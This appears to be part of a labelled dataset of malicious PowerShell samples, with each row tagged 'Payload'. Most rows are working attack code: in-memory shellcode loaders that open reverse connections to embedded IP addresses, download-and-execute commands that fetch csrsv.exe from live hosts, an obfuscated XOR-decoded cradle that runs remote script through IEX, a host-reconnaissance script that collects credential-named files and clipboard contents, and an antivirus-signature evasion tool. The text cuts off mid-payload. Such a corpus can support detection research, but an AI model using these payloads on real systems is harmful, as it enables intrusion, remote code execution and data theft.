$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x00,0x67,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
99aed12ef8c66606ba0273d0a5718572ef4719e48e95e02ba5029ee87b31372f,"function Invoke-WinEnum{

    

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$False,Position=0)]
        [string]$UserName,
        [Parameter(Mandatory=$False,Position=1)]
        [string[]]$keywords
    )


    Function Get-UserInfo{
        if($UserName){
            ""UserName: $UserName`n""
            $DomainUser = $UserName  
        }
        else{
             
            $DomainUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
            $UserName = $DomainUser.split('\')[-1]
            ""UserName: $UserName`n""
            
        }

        ""`n-------------------------------------`n""
        ""AD Group Memberships""
        ""`n-------------------------------------`n""
        
        Add-Type -AssemblyName System.DirectoryServices.AccountManagement
        
        $dsclass = ""System.DirectoryServices.AccountManagement""
        $dsclassUP = ""$dsclass.userprincipal"" -as [type] 
        $iType = ""SamAccountName""
        $Domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
        
        $contextTypeDomain = New-object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Domain,$Domain.Name) 
        
        $cName = $Domain.GetDirectoryEntry().distinguishedName
        
        $usr = $dsclassUP::FindByIdentity($contextTypeDomain,$iType,$DomainUser)
        
        $usr.GetGroups() | foreach {$_.Name}
        
        
        
        ""`n-------------------------------------`n""
        ""Password Last changed""
        ""`n-------------------------------------`n""

        $($usr.LastPasswordSet) + ""`n""
            
        ""`n-------------------------------------`n""
        ""Last 5 files opened""
        ""`n-------------------------------------`n""
            
        $AllOpenedFiles = Get-ChildItem -Path ""C:\"" -Recurse -Include @(""*.txt"",""*.pdf"",""*.docx"",""*.doc"",""*.xls"",""*.ppt"") -ea SilentlyContinue | Sort-Object {$_.LastAccessTime} 
        $LastOpenedFiles = @()
        $AllOpenedFiles | ForEach-Object {
            $owner = $($_.GetAccessControl()).Owner
            $owner = $owner.split('\')[-1]
            if($owner -eq $UserName){
                $LastOpenedFiles += $_
            }
        }
        if($LastOpenedFiles){
            $LastOpenedFiles | Sort-Object LastAccessTime -Descending | Select-Object FullName, LastAccessTime -First 5 | Format-List | Out-String
        }
        
        ""`n-------------------------------------`n""
        ""Interesting Files""
        ""`n-------------------------------------`n""
        
        $NewestInterestingFiles = @()
        if($keywords)
        {
            $AllInterestingFiles = Get-ChildItem -Path ""C:\"" -Recurse -Include $keywords -ea SilentlyContinue | where {$_.Mode.StartsWith('d') -eq $False} | Sort-Object {$_.LastAccessTime}
            $AllInterestingFiles | ForEach-Object {
                $owner = $_.GetAccessControl().Owner
                $owner = $owner.split('\')[-1]
                if($owner -eq $UserName){
                    $NewestInterestingFiles += $_
                }
            } 
            if($NewestInterestingFiles){
                $NewestInterestingFiles | Sort-Object LastAccessTime -Descending | Select-Object FullName, LastAccessTime | Format-List | Out-String
            }
        }
        else
        {
            $AllInterestingFiles = Get-ChildItem -Path ""C:\"" -Recurse -Include @(""*.txt"",""*.pdf"",""*.docx"",""*.doc"",""*.xls"",""*.ppt"",""*pass*"",""*cred*"") -ErrorAction SilentlyContinue | where {$_.Mode.StartsWith('d') -eq $False} | Sort-Object {$_.LastAccessTime} 
            $AllInterestingFiles | ForEach-Object {
                $owner = $_.GetAccessControl().Owner
                $owner = $owner.split('\')[-1]
                if($owner -eq $UserName){
                    $NewestInterestingFiles += $_
                }
            }
            if($NewestInterestingFiles)
            {
                $NewestInterestingFiles | Sort-Object LastAccessTime -Descending | Select-Object FullName, LastAccessTime | Format-List | Out-String
            }
        }
        
        ""`n-------------------------------------`n""
        ""Clipboard Contents""
        ""`n-------------------------------------`n""
        
        
        $cmd = {
            Add-Type -Assembly PresentationCore
            [Windows.Clipboard]::GetText() -replace ""`r"", '' -split ""`n""  
        }
        if([threading.thread]::CurrentThread.GetApartmentState() -eq 'MTA'){
            & powershell -Sta -Command $cmd
        }
        else{
            $cmd
        }
        ""`n""
    }
      
    Function Get-SysInfo{
        ""`n-------------------------------------`n""
        ""System Information""
        ""`n-------------------------------------`n""
        
        $OSVersion = (Get-WmiObject -class Win32_OperatingSystem).Caption
        $OSArch = (Get-WmiObject -class win32_operatingsystem).OSArchitecture
        ""OS: $OSVersion $OSArch`n""
        
        if($OSArch -eq '64-bit')
        {
            $registeredAppsx64 = Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName | Sort-Object DisplayName
            $registeredAppsx86 = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName | Sort-Object DisplayName
            $registeredAppsx64 | Where-Object {$_.DisplayName -ne ' '} | Select-Object DisplayName | Format-Table -AutoSize | Out-String
            $registeredAppsx86 | Where-Object {$_.DisplayName -ne ' '} | Select-Object DisplayName | Format-Table -AutoSize | Out-String
        }
        else
        {
            $registeredAppsx86 =  Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName | Sort-Object DisplayName
            $registeredAppsx86 | Where-Object {$_.DisplayName -ne ' '} | Select-Object DisplayName | Format-Table -AutoSize | Out-String
        }

        ""`n-------------------------------------`n""
        ""Services""
        ""`n-------------------------------------`n""

        $AllServices = @()
        Get-WmiObject -class win32_service | ForEach-Object{
            $service = New-Object PSObject -Property @{
                ServiceName = $_.DisplayName
                ServiceStatus = (Get-service | where-object { $_.DisplayName -eq $ServiceName}).status
                ServicePathtoExe = $_.PathName
                StartupType = $_.StartMode
            }
            $AllServices += $service  
        }

        $AllServices | Select ServicePathtoExe, ServiceName | Format-Table -AutoSize | Out-String

        ""`n-------------------------------------`n""
        ""Available Shares""
        ""`n-------------------------------------`n""

        Get-WmiObject -class win32_share | Format-Table -AutoSize Name, Path, Description, Status | Out-String

        ""`n-------------------------------------`n""
        ""AV Solution""
        ""`n-------------------------------------`n""

        $AV = Get-WmiObject -namespace root\SecurityCenter2 -class Antivirusproduct 
        if($AV){
            $AV.DisplayName + ""`n""
            
            
            $AVstate = $AV.productState
            $statuscode = ""{0:x6}"" -f $AVstate
            $wscprovider = $statuscode[0,1]
            $wscscanner = $statuscode[2,3]
            $wscuptodate = $statuscode[4,5]
            $statuscode = -join $statuscode

            ""AV Product State: "" + $AV.productState + ""`n""
            

            if($wscscanner -ge '10'){
                ""Enabled: Yes`n""
            }
            elseif($wscscanner -eq '00' -or $wscscanner -eq '01'){
                ""Enabled: No`n""
            }
            else{
                ""Enabled: Unknown`n""
            }
            
            if($wscuptodate -eq '00'){
                ""Updated: Yes`n""
            }
            elseif($wscuptodate -eq '10'){
                ""Updated: No`n""
            }
            else{
                ""Updated: Unknown`n""
            }
        }
        
        ""`n-------------------------------------`n""
        ""Windows Last Updated""
        ""`n-------------------------------------`n""
        $Lastupdate = Get-HotFix | Sort-Object InstalledOn -Descending | Select-Object InstalledOn -First 1
        if($Lastupdate){
           $Lastupdate.InstalledOn | Out-String
           ""`n""
        }
        else{
            ""Unknown`n"" 
        }    


    }

    
    Function Get-NetInfo{
        ""`n-------------------------------------`n""
        ""Network Adapters""
        ""`n-------------------------------------`n""
        
        foreach ($Adapter in (Get-WmiObject -class win32_networkadapter -Filter ""NetConnectionStatus='2'"")){
            $config = Get-WmiObject -class win32_networkadapterconfiguration -Filter ""Index = '$($Adapter.Index)'""
            ""`n""
            ""Adapter: "" + $Adapter.Name + ""`n""
            ""`n""
            ""IP Address: ""
            if($config.IPAddress -is [system.array]){
                $config.IPAddress[0] + ""`n""
            }
            else{
                $config.IPAddress + ""`n""
            }
            ""`n""
            ""Mac Address: "" + $Config.MacAddress
            ""`n""
        }

        ""`n-------------------------------------`n""
        ""Netstat Established connections and processes""
        ""`n-------------------------------------`n""
        

        $properties = 'Protocol','LocalAddress','LocalPort' 
        $properties += 'RemoteAddress','RemotePort','State','ProcessName','PID'

        netstat -ano | Select-String -Pattern '\s+(TCP|UDP)' | ForEach-Object {

            $item = $_.line.split("" "",[System.StringSplitOptions]::RemoveEmptyEntries)

            if($item[1] -notmatch '^\[::') 
            {            
                if (($la = $item[1] -as [ipaddress]).AddressFamily -eq 'InterNetworkV6') 
                { 
                    $localAddress = $la.IPAddressToString 
                    $localPort = $item[1].split('\]:')[-1] 
                } 
                else 
                { 
                    $localAddress = $item[1].split(':')[0] 
                    $localPort = $item[1].split(':')[-1] 
                } 

                if (($ra = $item[2] -as [ipaddress]).AddressFamily -eq 'InterNetworkV6') 
                { 
                    $remoteAddress = $ra.IPAddressToString 
                    $remotePort = $item[2].split('\]:')[-1] 
                } 
                else 
                { 
                    $remoteAddress = $item[2].split(':')[0] 
                    $remotePort = $item[2].split(':')[-1] 
                } 

                $netstat = New-Object PSObject -Property @{ 
                    PID = $item[-1] 
                    ProcessName = (Get-Process -Id $item[-1] -ErrorAction SilentlyContinue).Name 
                    Protocol = $item[0] 
                    LocalAddress = $localAddress 
                    LocalPort = $localPort 
                    RemoteAddress =$remoteAddress 
                    RemotePort = $remotePort 
                    State = if($item[0] -eq 'tcp') {$item[3]} else {$null} 
                }
                if($netstat.State -eq 'ESTABLISHED' ){
                    $netstat | Format-List ProcessName,LocalAddress,LocalPort,RemoteAddress,RemotePort,State | Out-String | % { $_.Trim() }
                    ""`n`n""
                }
            }
        }
    

        ""`n-------------------------------------`n""
        ""Mapped Network Drives""
        ""`n-------------------------------------`n""

        Get-WmiObject -class win32_logicaldisk | where-object {$_.DeviceType -eq 4} | ForEach-Object{
            $NetPath = $_.ProviderName
            $DriveLetter = $_.DeviceID
            $DriveName = $_.VolumeName
            $NetworkDrive = New-Object PSObject -Property @{
                Path = $NetPath
                Drive = $DriveLetter
                Name = $DriveName
            }
            $NetworkDrive
        }


        ""`n-------------------------------------`n""
        ""Firewall Rules""
        ""`n-------------------------------------`n""
        
        
        $fw = New-Object -ComObject HNetCfg.FwPolicy2 
        
        $FirewallRules = $fw.rules 
        
        $fwprofiletypes = @{1GB=""All"";1=""Domain""; 2=""Private"" ; 4=""Public""}
        $fwaction = @{1=""Allow"";0=""Block""}
        $FwProtocols = @{1=""ICMPv4"";2=""IGMP"";6=""TCP"";17=""UDP"";41=""IPV6"";43=""IPv6Route""; 44=""IPv6Frag"";
                  47=""GRE""; 58=""ICMPv6"";59=""IPv6NoNxt"";60=""IPv60pts"";112=""VRRP""; 113=""PGM"";115=""L2TP""}
        $fwdirection = @{1=""Inbound""; 2=""Outbound""} 

        

        $fwprofiletype = $fwprofiletypes.Get_Item($fw.CurrentProfileTypes)
        $fwrules = $fw.rules

        ""Current Firewall Profile Type in use: $fwprofiletype""
        $AllFWRules = @()
        
        $fwrules | ForEach-Object{
            
            $FirewallRule = New-Object PSObject -Property @{
                ApplicationName = $_.Name
                Protocol = $fwProtocols.Get_Item($_.Protocol)
                Direction = $fwdirection.Get_Item($_.Direction)
                Action = $fwaction.Get_Item($_.Action)
                LocalIP = $_.LocalAddresses
                LocalPort = $_.LocalPorts
                RemoteIP = $_.RemoteAddresses
                RemotePort = $_.RemotePorts
            }

            $AllFWRules += $FirewallRule

            
        } 
        $AllFWRules | Select-Object Action, Direction, RemoteIP, RemotePort, LocalPort, ApplicationName | Format-List | Out-String  
    }

    Get-UserInfo
    Get-SysInfo
    Get-NetInfo



}",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
b6661bc9233551fb07b96d78c87917d5534e1f0eb1be25894eb5b5c9be7bd767,"
(New-Object System.Net.WebClient).DownloadFile('http://89.248.170.218/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
ec87ffe423486c742f66bfbae0fbfa9bce58ff44028f14de163c653844d0e326,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x55,0x34,0x0c,0x75,0x68,0x02,0x00,0x09,0xca,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x3f,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xe9,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xc3,0x01,0xc3,0x29,0xc6,0x75,0xe9,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
849c54760b144a33d089157a55b0012cff90b2c4fb4ea4fca5223e4b785f1dde,"function Find-AVSignature
{


    [CmdletBinding()] Param(
        [Parameter(Mandatory = $True)]
        [ValidateRange(0,4294967295)]
		[UInt32]
        $StartByte,

        [Parameter(Mandatory = $True)]
        [String]
        $EndByte,

        [Parameter(Mandatory = $True)]
        [ValidateRange(0,4294967295)]
		[UInt32]
        $Interval,

        [String]
		[ValidateScript({Test-Path $_ })]
        $Path = ($pwd.path),

        [String]
        $OutPath = ($pwd),
		
		
		[ValidateRange(1,2097152)]
		[UInt32]
		$BufferLen = 65536,
		
        [Switch] $Force
		
    )

    
    if (!(Test-Path $Path)) {Throw ""File path not found""}
    $Response = $True
    if (!(Test-Path $OutPath)) {
        if ($Force -or ($Response = $psCmdlet.ShouldContinue(""The `""$OutPath`"" does not exist! Do you want to create the directory?"",""""))){new-item ($OutPath)-type directory}
	}
    if (!$Response) {Throw ""Output path not found""}
    if (!(Get-ChildItem $Path).Exists) {Throw ""File not found""}
    [Int32] $FileSize = (Get-ChildItem $Path).Length
    if ($StartByte -gt ($FileSize - 1) -or $StartByte -lt 0) {Throw ""StartByte range must be between 0 and $Filesize""}
    [Int32] $MaximumByte = (($FileSize) - 1)
    if ($EndByte -ceq ""max"") {$EndByte = $MaximumByte}
	
	
	[Int32]$EndByte = $EndByte 
	
	
    if ($EndByte -gt $FileSize) {$EndByte = $MaximumByte}
	
	
	if ($EndByte -lt $StartByte) {$EndByte = $StartByte + $Interval}

	Write-Verbose ""StartByte: $StartByte""
	Write-Verbose ""EndByte: $EndByte""
	
    
    [String] $FileName = (Split-Path $Path -leaf).Split('.')[0]

    
    [Int32] $ResultNumber = [Math]::Floor(($EndByte - $StartByte) / $Interval)
    if (((($EndByte - $StartByte) % $Interval)) -gt 0) {$ResultNumber = ($ResultNumber + 1)}
    
    
    $Response = $True
    if ( $Force -or ( $Response = $psCmdlet.ShouldContinue(""This script will result in $ResultNumber binaries being written to `""$OutPath`""!"",
             ""Do you want to continue?""))){}
    if (!$Response) {Return}
    
    Write-Verbose ""This script will now write $ResultNumber binaries to `""$OutPath`""."" 
    [Int32] $Number = [Math]::Floor($Endbyte/$Interval)
    
		
		
		[Byte[]] $ReadBuffer=New-Object byte[] $BufferLen
		[System.IO.FileStream] $ReadStream = New-Object System.IO.FileStream($Path, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::Read, $BufferLen)
		
        
        [Int32] $i = 0
        for ($i -eq 0; $i -lt $ResultNumber + 1 ; $i++)
        {
			
			if ($i -eq $ResultNumber) {[Int32]$SplitByte = $EndByte}
			else {[Int32] $SplitByte = (($StartByte) + (($Interval) * ($i)))}
			
			Write-Verbose ""Byte 0 -> $($SplitByte)""
			
			
			$ReadStream.Seek(0, [System.IO.SeekOrigin]::Begin) | Out-Null
			
			
			[String] $outfile = Join-Path $OutPath ""$($FileName)_$($SplitByte).bin""
			[System.IO.FileStream] $WriteStream = New-Object System.IO.FileStream($outfile, [System.IO.FileMode]::Create, [System.IO.FileAccess]::Write, [System.IO.FileShare]::None, $BufferLen)
			
			[Int32] $BytesLeft = $SplitByte
			Write-Verbose ""$($WriteStream.name)""
			
			
			while ($BytesLeft -gt $BufferLen){
				[Int32]$count = $ReadStream.Read($ReadBuffer, 0, $BufferLen)
				$WriteStream.Write($ReadBuffer, 0, $count)
				$BytesLeft = $BytesLeft - $count
			}
			
			
			do {
				[Int32]$count = $ReadStream.Read($ReadBuffer, 0, $BytesLeft)
				$WriteStream.Write($ReadBuffer, 0, $count)
				$BytesLeft = $BytesLeft - $count			
			}
			until ($BytesLeft -eq 0)
			$WriteStream.Close()
			$WriteStream.Dispose()
        }
        Write-Verbose ""Files written to disk. Flushing memory.""
        $ReadStream.Dispose()
        
		
        [System.GC]::Collect()
        Write-Verbose ""Completed!""
}
",Payload
b76055c7c347af24aecf66431164a22e0b3b3ad85c791d91bc0f5767f1146d0b,"
$wc=New-OBjEct SysTEm.NET.WEbClienT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wC.HEADERS.ADD('User-Agent',$u);$WC.PrOxy = [SYSTeM.NEt.WebREQuEsT]::DEfAuLtWEBPrOxy;$wC.PROxY.CrEdENtiAlS = [SySTEm.NEt.CrEdENtialCAChe]::DEfAulTNetwORKCReDENtIALs;$K='uwHNGYlK*RWa.$6B?1|O@AboZ[;vj/+d';$I=0;[cHAR[]]$b=([ChaR[]]($WC.DOwnLOAdStRiNg(""http://188.68.59.11:8081/index.asp"")))|%{$_-BXoR$K[$i++%$k.LEngth]};IEX ($B-Join'')

",Payload
48e37a75ba72807d6465b052bf78740a533796a474213c3adb63d11e44f8e3dc,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x58,0x7a,0x17,0x20,0x68,0x02,0x00,0x11,0x51,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
c0c9d579ceffc7eb9bc8d92af0a4a1dc9dd75c4e91228b36d31898a8182f09f1,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0